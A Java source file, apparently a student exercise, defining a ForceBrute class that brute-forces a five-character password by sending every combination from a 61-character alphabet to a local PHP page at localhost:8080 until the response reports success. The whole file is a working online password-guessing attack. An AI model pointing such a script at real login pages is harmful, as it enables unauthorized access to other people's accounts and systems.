import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;

public class ForceBrute implements Attack {

    public ForceBrute() {}

    public String passwordCracker() throws IOException {
        String dictionnary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
        String pswd = "";
        long beggining = System.currentTimeMillis();
        for (int i = 0; i < dictionnary.length(); i++) {
            for (int j = 0; j < dictionnary.length(); j++) {
                for (int w = 0; w < dictionnary.length(); w++) {
                    for (int k = 0; k < dictionnary.length(); k++) {
                        for (int z = 0; z < dictionnary.length(); z++) {

                            pswd = dictionnary.charAt(i) + "" + dictionnary.charAt(j) + dictionnary.charAt(w) + dictionnary.charAt(k)
                                    + dictionnary.charAt(z);
                            URL url = new URL("http://localhost:8080/MesProjets/UserPage.php?pwd=" + pswd);
                            URLConnection connection = url.openConnection();

                            try (BufferedReader in = new BufferedReader(
                                    new InputStreamReader(connection.getInputStream()))) {
                                String line;
                                while ((line = in.readLine()) != null) {
                                    
                                    System.out.println(line);
                                    if(line.equals("succesfully")) {
                                        System.out.println("Welcome Saliou Samba Diao you are at your secret page for administrating the DataBases");
                                        long end = System.currentTimeMillis();
                                        long executionTime = (end - beggining) / 1000;
                                        System.out.println("The execution time is : " + executionTime + " seconds");
                                        System.exit(0);
                                    }
                                }
                                
                                
                            }
                        }
                    }
                }
            }
        }
        System.out.print(pswd);
        return pswd;

    }

}
